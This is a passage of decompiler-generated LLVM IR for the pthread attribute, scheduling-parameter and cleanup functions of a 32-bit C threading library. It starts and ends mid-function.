  uselistorder label %dec_label_pc_8059a30, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8059a65 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059a6f = urem i32 %arg1, 1024
  %v2_8059a74 = mul nuw nsw i32 %v1_8059a6f, 16
  %v1_8059a77 = add i32 %v2_8059a74, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_8059a77, i32* @ebx, align 4
  store i32 %v1_8059a77, i32* @eax, align 4
  %v1_8059a7f = call i32 @__pthread_lock(i32 %v0_8059a65)
  %v0_8059a84 = load i32, i32* @ebx, align 4
  %v1_8059a84 = add i32 %v0_8059a84, 8
  %v2_8059a84 = inttoptr i32 %v1_8059a84 to i32*
  %v3_8059a84 = load i32, i32* %v2_8059a84, align 4
  %v1_8059a87 = icmp eq i32 %v3_8059a84, 0
  br i1 %v1_8059a87, label %dec_label_pc_8059a90, label %dec_label_pc_8059a8b

dec_label_pc_8059a8b:                             ; preds = %entry
  %v1_8059a8b = add i32 %v3_8059a84, 16
  %v2_8059a8b = inttoptr i32 %v1_8059a8b to i32*
  %v3_8059a8b = load i32, i32* %v2_8059a8b, align 4
  %v4_8059a8b = load i32, i32* @esi, align 4
  %v15_8059a8b = icmp eq i32 %v3_8059a8b, %v4_8059a8b
  br i1 %v15_8059a8b, label %dec_label_pc_8059aa3, label %dec_label_pc_8059a90

dec_label_pc_8059a90:                             ; preds = %dec_label_pc_8059a8b, %entry
  store i32 %v0_8059a84, i32* %stack_var_-28, align 4
  %v1_8059a94 = inttoptr i32 %v0_8059a84 to i32*
  %v2_8059a94 = call i32 @__pthread_unlock(i32* %v1_8059a94)
  br label %dec_label_pc_8059ae4

dec_label_pc_8059aa3:                             ; preds = %dec_label_pc_8059a8b
  %v1_8059aa3 = add i32 %v3_8059a84, 20
  %v2_8059aa3 = inttoptr i32 %v1_8059aa3 to i32*
  %v3_8059aa3 = load i32, i32* %v2_8059aa3, align 4
  store i32 %v3_8059aa3, i32* @esi, align 4
  store i32 %v0_8059a84, i32* %stack_var_-28, align 4
  %v1_8059aaa = inttoptr i32 %v0_8059a84 to i32*
  %v2_8059aaa = call i32 @__pthread_unlock(i32* %v1_8059aaa)
  %v0_8059aaf = load i32, i32* @esi, align 4
  store i32 %v0_8059aaf, i32* %stack_var_-28, align 4
  %v1_8059ab2 = call i32 @sched_getscheduler(i32 %v0_8059aaf)
  %v10_8059aba = icmp eq i32 %v1_8059ab2, -1
  store i32 %v1_8059ab2, i32* @ebx, align 4
  br i1 %v10_8059aba, label %dec_label_pc_8059ad3, label %dec_label_pc_8059ac1

dec_label_pc_8059ac1:                             ; preds = %dec_label_pc_8059aa3
  %v0_8059ac1 = load i32, i32* @ecx, align 4
  %v0_8059ac7 = load i32, i32* @esi, align 4
  store i32 %v0_8059ac7, i32* %stack_var_-28, align 4
  %v4_8059ac8 = call i32 @sched_getparam(i32 %v0_8059ac7, i32 %arg3, i32 %v0_8059ac1, i32 %v0_8059ac1)
  %v8_8059ad0 = icmp eq i32 %v4_8059ac8, -1
  %v1_8059ad1 = icmp eq i1 %v8_8059ad0, false
  br i1 %v1_8059ad1, label %dec_label_pc_8059adc, label %dec_label_pc_8059ad3

dec_label_pc_8059ad3:                             ; preds = %dec_label_pc_8059ac1, %dec_label_pc_8059aa3
  %v0_8059ad3 = load i32, i32* %stack_var_-28, align 4
  %v1_8059ad3 = call i32 @__errno_location(i32 %v0_8059ad3)
  %v1_8059ad8 = inttoptr i32 %v1_8059ad3 to i32*
  %v2_8059ad8 = load i32, i32* %v1_8059ad8, align 4
  br label %dec_label_pc_8059ae4

dec_label_pc_8059adc:                             ; preds = %dec_label_pc_8059ac1
  %v0_8059ae0 = load i32, i32* @ebx, align 4
  store i32 %v0_8059ae0, i32* %arg2, align 4
  br label %dec_label_pc_8059ae4

dec_label_pc_8059ae4:                             ; preds = %dec_label_pc_8059ad3, %dec_label_pc_8059a90, %dec_label_pc_8059adc
  %v0_8059ae7 = phi i32 [ %v2_8059ad8, %dec_label_pc_8059ad3 ], [ 3, %dec_label_pc_8059a90 ], [ 0, %dec_label_pc_8059adc ]
  ret i32 %v0_8059ae7

; uselistorder directives
  uselistorder i32 %v1_8059ab2, { 1, 0 }
  uselistorder i32 %v3_8059a84, { 1, 0, 2 }
  uselistorder i32 %v0_8059a84, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8059ae4, { 2, 0, 1 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  br i1 %tmp3, label %dec_label_pc_8059af9, label %dec_label_pc_8059b01

dec_label_pc_8059af9:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_8059b01

dec_label_pc_8059b01:                             ; preds = %entry, %dec_label_pc_8059af9
  %v0_8059b01 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059af9 ]
  ret i32 %v0_8059b01

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059b01, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8059b06 = load i32, i32* %arg1, align 4
  %v2_8059b0c = inttoptr i32 %arg2 to i32*
  store i32 %v2_8059b06, i32* %v2_8059b0c, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_8059b1d = icmp ugt i32 %arg2, 2
  br i1 %v6_8059b1d, label %dec_label_pc_8059b28, label %dec_label_pc_8059b1f

dec_label_pc_8059b1f:                             ; preds = %entry
  %v2_8059b23 = add i32 %arg1, 4
  %v3_8059b23 = inttoptr i32 %v2_8059b23 to i32*
  store i32 %arg2, i32* %v3_8059b23, align 4
  br label %dec_label_pc_8059b28

dec_label_pc_8059b28:                             ; preds = %entry, %dec_label_pc_8059b1f
  %v0_8059b28 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059b1f ]
  ret i32 %v0_8059b28

; uselistorder directives
  uselistorder label %dec_label_pc_8059b28, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059b2d = add i32 %arg1, 4
  %v2_8059b2d = inttoptr i32 %v1_8059b2d to i32*
  %v3_8059b2d = load i32, i32* %v2_8059b2d, align 4
  store i32 %v3_8059b2d, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  br i1 %tmp3, label %dec_label_pc_8059b47, label %dec_label_pc_8059b50

dec_label_pc_8059b47:                             ; preds = %entry
  %v2_8059b4b = add i32 %arg1, 12
  %v3_8059b4b = inttoptr i32 %v2_8059b4b to i32*
  store i32 %arg2, i32* %v3_8059b4b, align 4
  br label %dec_label_pc_8059b50

dec_label_pc_8059b50:                             ; preds = %entry, %dec_label_pc_8059b47
  %v0_8059b50 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059b47 ]
  ret i32 %v0_8059b50

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059b50, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059b55 = add i32 %arg1, 12
  %v2_8059b55 = inttoptr i32 %v1_8059b55 to i32*
  %v3_8059b55 = load i32, i32* %v2_8059b55, align 4
  store i32 %v3_8059b55, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v1_8059b65 = icmp eq i32 %arg2, 0
  br i1 %v1_8059b65, label %dec_label_pc_8059b79, label %dec_label_pc_8059b69

dec_label_pc_8059b69:                             ; preds = %entry
  %v8_8059b69 = icmp eq i32 %arg2, 1
  %v1_8059b74 = icmp eq i1 %v8_8059b69, false
  %v4_8059b74 = select i1 %v1_8059b74, i32 22, i32 95
  store i32 %v4_8059b74, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059b86

dec_label_pc_8059b79:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8059b7f = add i32 %arg1, 16
  %v2_8059b7f = inttoptr i32 %v1_8059b7f to i32*
  store i32 0, i32* %v2_8059b7f, align 4
  %v0_8059b86.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059b86

dec_label_pc_8059b86:                             ; preds = %dec_label_pc_8059b69, %dec_label_pc_8059b79
  %v0_8059b86 = phi i32 [ %v4_8059b74, %dec_label_pc_8059b69 ], [ %v0_8059b86.pre, %dec_label_pc_8059b79 ]
  ret i32 %v0_8059b86

; uselistorder directives
  uselistorder label %dec_label_pc_8059b86, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059b8d = add i32 %arg1, 16
  %v2_8059b8d = inttoptr i32 %v1_8059b8d to i32*
  %v3_8059b8d = load i32, i32* %v2_8059b8d, align 4
  store i32 %v3_8059b8d, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059b9d = add i32 %arg1, 20
  %v2_8059b9d = inttoptr i32 %v1_8059b9d to i32*
  %v3_8059b9d = load i32, i32* %v2_8059b9d, align 4
  store i32 %v3_8059b9d, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_8059bb1 = add i32 %arg1, 28
  %v3_8059bb1 = inttoptr i32 %v2_8059bb1 to i32*
  store i32 %arg2, i32* %v3_8059bb1, align 4
  %v0_8059bb6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059bb6 = add i32 %v0_8059bb6, 24
  %v2_8059bb6 = inttoptr i32 %v1_8059bb6 to i32*
  store i32 1, i32* %v2_8059bb6, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059bc2 = add i32 %arg1, 28
  %v2_8059bc2 = inttoptr i32 %v1_8059bc2 to i32*
  %v3_8059bc2 = load i32, i32* %v2_8059bc2, align 4
  store i32 %v3_8059bc2, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_8059be8, label %dec_label_pc_8059bdf

dec_label_pc_8059bdf:                             ; preds = %entry
  %v2_8059be3 = add i32 %arg1, 32
  %v3_8059be3 = inttoptr i32 %v2_8059be3 to i32*
  store i32 %arg2, i32* %v3_8059be3, align 4
  br label %dec_label_pc_8059be8

dec_label_pc_8059be8:                             ; preds = %entry, %dec_label_pc_8059bdf
  %v0_8059be8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059bdf ]
  ret i32 %v0_8059be8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059be8, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8059bed = add i32 %arg1, 32
  %v2_8059bed = inttoptr i32 %v1_8059bed to i32*
  %v3_8059bed = load i32, i32* %v2_8059bed, align 4
  store i32 %v3_8059bed, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059bf9 = load i32, i32* @ebx, align 4
  store i32 %v0_8059bf9, i32* %stack_var_-4, align 4
  %v1_8059bfd = call i32 @__GI_getpagesize(i32 %v0_8059bf9)
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  store i32 2097152, i32* %edx.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_8059c11 = add i32 %tmp1, 4
  %v2_8059c11 = inttoptr i32 %v1_8059c11 to i32*
  store i32 0, i32* %v2_8059c11, align 4
  %v0_8059c18 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059c18 = sub i32 %v0_8059c18, %v1_8059bfd
  store i32 %v2_8059c18, i32* %edx.global-to-local, align 4
  %v1_8059c1a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059c1a = add i32 %v1_8059c1a, 20
  %v3_8059c1a = inttoptr i32 %v2_8059c1a to i32*
  store i32 %v1_8059bfd, i32* %v3_8059c1a, align 4
  %v0_8059c1f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c1f = add i32 %v0_8059c1f, 8
  %v2_8059c1f = inttoptr i32 %v1_8059c1f to i32*
  store i32 0, i32* %v2_8059c1f, align 4
  %v0_8059c26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c26 = add i32 %v0_8059c26, 12
  %v2_8059c26 = inttoptr i32 %v1_8059c26 to i32*
  store i32 1, i32* %v2_8059c26, align 4
  %v0_8059c2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c2d = add i32 %v0_8059c2d, 16
  %v2_8059c2d = inttoptr i32 %v1_8059c2d to i32*
  store i32 0, i32* %v2_8059c2d, align 4
  %v0_8059c34 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c34 = add i32 %v0_8059c34, 28
  %v2_8059c34 = inttoptr i32 %v1_8059c34 to i32*
  store i32 0, i32* %v2_8059c34, align 4
  %v0_8059c3b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059c3b = add i32 %v0_8059c3b, 24
  %v2_8059c3b = inttoptr i32 %v1_8059c3b to i32*
  store i32 0, i32* %v2_8059c3b, align 4
  %v0_8059c42 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059c42 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059c42 = add i32 %v1_8059c42, 32
  %v3_8059c42 = inttoptr i32 %v2_8059c42 to i32*
  store i32 %v0_8059c42, i32* %v3_8059c42, align 4
  %v2_8059c45 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059c45, i32* %edx.global-to-local, align 4
  %v2_8059c47 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059c47, i32* %ebx.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8059bfd, { 1, 0 }
  uselistorder i32 2097152, { 3, 0, 2, 1 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8059c4a = load i32, i32* @ebx, align 4
  %v1_8059c4e = call i32 @__GI_getpagesize(i32 %v0_8059c4a)
  %v3_8059c5b = add i32 %arg2, -1
  %v4_8059c5b = add i32 %v3_8059c5b, %v1_8059c4e
  %tmp7 = urem i32 %v4_8059c5b, %v1_8059c4e
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8059c6e = sub i32 %v4_8059c5b, %tmp7
  %v2_8059c71 = add i32 %arg1, 32
  %v3_8059c71 = inttoptr i32 %v2_8059c71 to i32*
  %v4_8059c71 = load i32, i32* %v3_8059c71, align 4
  %v10_8059c71 = icmp ult i32 %v4_8059c6e, %v4_8059c71
  %v1_8059c74 = icmp eq i1 %v10_8059c71, false
  br i1 %v1_8059c74, label %dec_label_pc_8059c7b, label %dec_label_pc_8059c76

dec_label_pc_8059c76:                             ; preds = %entry
  %v2_8059c76 = add i32 %arg1, 20
  %v3_8059c76 = inttoptr i32 %v2_8059c76 to i32*
  store i32 %v4_8059c6e, i32* %v3_8059c76, align 4
  %v10_8059c79 = load i32, i32* %eax.global-to-local, align 4
  %v11_8059c79 = and i32 %v10_8059c79, -256
  store i32 %v11_8059c79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059c7b

dec_label_pc_8059c7b:                             ; preds = %entry, %dec_label_pc_8059c76
  %v0_8059c7e = phi i32 [ 22, %entry ], [ %v11_8059c79, %dec_label_pc_8059c76 ]
  ret i32 %v0_8059c7e

; uselistorder directives
  uselistorder label %dec_label_pc_8059c7b, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8059c88 = add i32 %arg1, 8
  %v3_8059c90 = inttoptr i32 %arg2 to i16*
  %v4_8059c90 = call i32 @memcpy(i16* %v3_8059c90, i32 %v1_8059c88, i32 4)
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v1_8059ca9 = add i32 %arg1, 4
  %v2_8059ca9 = inttoptr i32 %v1_8059ca9 to i32*
  %v3_8059ca9 = load i32, i32* %v2_8059ca9, align 4
  %v1_8059cac = call i32 @sched_get_priority_max(i32 %v3_8059ca9)
  store i32 %v1_8059cac, i32* @ebx, align 4
  %v0_8059cb4 = load i32, i32* @esi, align 4
  %v1_8059cb4 = add i32 %v0_8059cb4, 4
  %v2_8059cb4 = inttoptr i32 %v1_8059cb4 to i32*
  %v3_8059cb4 = load i32, i32* %v2_8059cb4, align 4
  %v1_8059cb7 = call i32 @sched_get_priority_min(i32 %v3_8059cb4)
  %v0_8059cbc = load i32, i32* @edi, align 4
  %v1_8059cbc = inttoptr i32 %v0_8059cbc to i32*
  %v2_8059cbc = load i32, i32* %v1_8059cbc, align 4
  %v5_8059cc3 = icmp slt i32 %v2_8059cbc, %v1_8059cb7
  br i1 %v5_8059cc3, label %dec_label_pc_8059cdd, label %dec_label_pc_8059cc5

dec_label_pc_8059cc5:                             ; preds = %entry
  %v1_8059cc5 = load i32, i32* @ebx, align 4
  %v8_8059cc7 = icmp sgt i32 %v2_8059cbc, %v1_8059cc5
  br i1 %v8_8059cc7, label %dec_label_pc_8059cdd, label %dec_label_pc_8059cc9

dec_label_pc_8059cc9:                             ; preds = %dec_label_pc_8059cc5
  %v0_8059ccd = load i32, i32* @esi, align 4
  %v1_8059ccd = add i32 %v0_8059ccd, 8
  %v3_8059cd1 = inttoptr i32 %v1_8059ccd to i16*
  %v4_8059cd1 = call i32 @memcpy(i16* %v3_8059cd1, i32 %v0_8059cbc, i32 4)
  br label %dec_label_pc_8059ce2

dec_label_pc_8059cdd:                             ; preds = %dec_label_pc_8059cc5, %entry
  br label %dec_label_pc_8059ce2

dec_label_pc_8059ce2:                             ; preds = %dec_label_pc_8059cc9, %dec_label_pc_8059cdd
  %v0_8059ce5 = phi i32 [ 0, %dec_label_pc_8059cc9 ], [ 22, %dec_label_pc_8059cdd ]
  ret i32 %v0_8059ce5

; uselistorder directives
  uselistorder label %dec_label_pc_8059ce2, { 1, 0 }
}

define i32 @thread_self.8(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_8059ce8 = load i32, i32* @esp, align 4
  %v1_8059ce8 = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_8059ce8 = icmp ult i32 %v0_8059ce8, %v1_8059ce8
  %v1_8059cee = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8059cee, i32* @edx, align 4
  %v1_8059cf5 = icmp eq i1 %v7_8059ce8, false
  br i1 %v1_8059cf5, label %dec_label_pc_8059d26, label %dec_label_pc_8059cf7

dec_label_pc_8059cf7:                             ; preds = %entry
  %v1_8059cf7 = load i32, i32* @global_var_8079c50.566, align 16
  %v7_8059cf7 = icmp ult i32 %v0_8059ce8, %v1_8059cf7
  br i1 %v7_8059cf7, label %dec_label_pc_8059d0c, label %dec_label_pc_8059cff

dec_label_pc_8059cff:                             ; preds = %dec_label_pc_8059cf7
  %v1_8059cff = load i32, i32* @global_var_8079c54.567, align 4
  %v7_8059cff = icmp ult i32 %v0_8059ce8, %v1_8059cff
  br i1 %v7_8059cff, label %dec_label_pc_8059d26, label %dec_label_pc_8059d0c

dec_label_pc_8059d0c:                             ; preds = %dec_label_pc_8059cff, %dec_label_pc_8059cf7
  %v0_8059d0c = load i32, i32* @global_var_807f358.569, align 8
  %v1_8059d0c = icmp eq i32 %v0_8059d0c, 0
  br i1 %v1_8059d0c, label %dec_label_pc_8059d1a, label %dec_label_pc_8059d15

dec_label_pc_8059d15:                             ; preds = %dec_label_pc_8059d0c
  %v0_8059d15 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8059d1a

dec_label_pc_8059d1a:                             ; preds = %dec_label_pc_8059d0c, %dec_label_pc_8059d15
  %v3_8059d1a = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8059d1a, i32* @edx, align 4
  %v2_8059d20 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8059d26

dec_label_pc_8059d26:                             ; preds = %dec_label_pc_8059cff, %entry, %dec_label_pc_8059d1a
  %v0_8059d26 = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_8059cff ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_8059d20, %dec_label_pc_8059d1a ]
  ret i32 %v0_8059d26

; uselistorder directives
  uselistorder label %dec_label_pc_8059d26, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059d1a, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8059d27 = load i32, i32* @edi, align 4
  %v0_8059d28 = load i32, i32* @esi, align 4
  %v0_8059d29 = load i32, i32* @ebx, align 4
  store i32 %v0_8059d29, i32* %stack_var_-12, align 4
  %v1_8059d2a = call i32 @thread_self.8(i32 %v0_8059d29)
  store i32 %v1_8059d2a, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8059d33 = add i32 %v1_8059d2a, 60
  %v2_8059d33 = inttoptr i32 %v1_8059d33 to i32*
  %v3_8059d33 = load i32, i32* %v2_8059d33, align 4
  store i32 %v3_8059d33, i32* %ebx.global-to-local, align 4
  store i32 %v1_8059d2a, i32* %esi.global-to-local, align 4
  %v1_8059d4c2 = icmp eq i32 %v3_8059d33, 0
  %v1_8059d4e9 = icmp eq i1 %v1_8059d4c2, false
  br i1 %v1_8059d4e9, label %dec_label_pc_8059d3a.lr.ph, label %dec_label_pc_8059d50

dec_label_pc_8059d3a.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_8059d33, %arg1
  br i1 %tmp, label %dec_label_pc_8059d3e.lr.ph, label %dec_label_pc_8059d50.loopexit

dec_label_pc_8059d3e.lr.ph:                       ; preds = %dec_label_pc_8059d3a.lr.ph
  br label %dec_label_pc_8059d3e

dec_label_pc_8059d3e:                             ; preds = %dec_label_pc_8059d3e.dec_label_pc_8059d3a_crit_edge, %dec_label_pc_8059d3e.lr.ph
  %v4_8059d4430 = phi i32 [ %v3_8059d33, %dec_label_pc_8059d3e.lr.ph ], [ %v3_8059d46, %dec_label_pc_8059d3e.dec_label_pc_8059d3a_crit_edge ]
  %v5_8059d44 = inttoptr i32 %v4_8059d4430 to i32*
  %v6_8059d44 = load i32, i32* %v5_8059d44, align 4
  call void @__pseudo_call(i32 %v6_8059d44)
  %v0_8059d46 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059d46 = add i32 %v0_8059d46, 12
  %v2_8059d46 = inttoptr i32 %v1_8059d46 to i32*
  %v3_8059d46 = load i32, i32* %v2_8059d46, align 4
  store i32 %v3_8059d46, i32* %ebx.global-to-local, align 4
  %v1_8059d4c = icmp eq i32 %v3_8059d46, 0
  %v1_8059d4e = icmp eq i1 %v1_8059d4c, false
  br i1 %v1_8059d4e, label %dec_label_pc_8059d3e.dec_label_pc_8059d3a_crit_edge, label %dec_label_pc_8059d50.loopexit

dec_label_pc_8059d3e.dec_label_pc_8059d3a_crit_edge: ; preds = %dec_label_pc_8059d3e
  %v1_8059d3a.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp33 = icmp ugt i32 %v3_8059d46, %v1_8059d3a.pre
  br i1 %tmp33, label %dec_label_pc_8059d3e, label %dec_label_pc_8059d50.loopexit

dec_label_pc_8059d50.loopexit:                    ; preds = %dec_label_pc_8059d3e.dec_label_pc_8059d3a_crit_edge, %dec_label_pc_8059d3a.lr.ph, %dec_label_pc_8059d3e
  %v0_8059d50.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059d50

dec_label_pc_8059d50:                             ; preds = %dec_label_pc_8059d50.loopexit, %entry
  %v0_8059d50 = phi i32 [ %v0_8059d50.pre, %dec_label_pc_8059d50.loopexit ], [ %v1_8059d2a, %entry ]
  %v1_8059d50 = add i32 %v0_8059d50, 372
  %v2_8059d50 = inttoptr i32 %v1_8059d50 to i32*
  %v3_8059d50 = load i32, i32* %v2_8059d50, align 4
  %v4_8059d50 = icmp eq i32 %v3_8059d50, 0
  br i1 %v4_8059d50, label %dec_label_pc_8059d50.dec_label_pc_8059d61_crit_edge, label %dec_label_pc_8059d59

dec_label_pc_8059d50.dec_label_pc_8059d61_crit_edge: ; preds = %dec_label_pc_8059d50
  %v0_8059d64.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059d61

dec_label_pc_8059d59:                             ; preds = %dec_label_pc_8059d50
  %v2_8059d59 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059d59, i32* @ebx, align 4
  store i32 %v0_8059d28, i32* @esi, align 4
  store i32 %v0_8059d27, i32* @edi, align 4
  %v0_8059d5c = call i32 @__rpc_thread_destroy()
  store i32 %v0_8059d5c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059d61

dec_label_pc_8059d61:                             ; preds = %dec_label_pc_8059d50.dec_label_pc_8059d61_crit_edge, %dec_label_pc_8059d59
  %v0_8059d64 = phi i32 [ %v0_8059d64.pre, %dec_label_pc_8059d50.dec_label_pc_8059d61_crit_edge ], [ %v0_8059d5c, %dec_label_pc_8059d59 ]
  %v2_8059d61 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059d61, i32* @ebx, align 4
  store i32 %v0_8059d28, i32* @esi, align 4
  store i32 %v0_8059d27, i32* @edi, align 4
  ret i32 %v0_8059d64

; uselistorder directives
  uselistorder i32 %v3_8059d46, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8059d33, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8059d28, { 1, 0 }
  uselistorder i32 %v0_8059d27, { 1, 0 }
  uselistorder label %dec_label_pc_8059d61, { 1, 0 }
  uselistorder label %dec_label_pc_8059d50.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059d65 = load i32, i32* @ebx, align 4
  store i32 %v0_8059d65, i32* %stack_var_-4, align 4
  %v1_8059d69 = call i32 @thread_self.8(i32 %v0_8059d65)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8059d69, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_8059d7e = add i32 %tmp3, 4
  %v3_8059d7e = inttoptr i32 %v2_8059d7e to i32*
  store i32 %arg3, i32* %v3_8059d7e, align 4
  %v0_8059d81 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059d81 = add i32 %v0_8059d81, 65
  %v2_8059d81 = inttoptr i32 %v1_8059d81 to i8*
  %v3_8059d81 = load i8, i8* %v2_8059d81, align 1
  %v4_8059d81 = sext i8 %v3_8059d81 to i32
  %v1_8059d85 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059d85 = add i32 %v1_8059d85, 8
  %v3_8059d85 = inttoptr i32 %v2_8059d85 to i32*
  store i32 %v4_8059d81, i32* %v3_8059d85, align 4
  %v0_8059d88 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059d88 = add i32 %v0_8059d88, 60
  %v2_8059d88 = inttoptr i32 %v1_8059d88 to i32*
  %v3_8059d88 = load i32, i32* %v2_8059d88, align 4
  %v1_8059d8b = icmp eq i32 %v3_8059d88, 0
  %v1_8059d8d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059d8d = add i32 %v1_8059d8d, 12
  %v3_8059d8d = inttoptr i32 %v2_8059d8d to i32*
  store i32 %v3_8059d88, i32* %v3_8059d8d, align 4
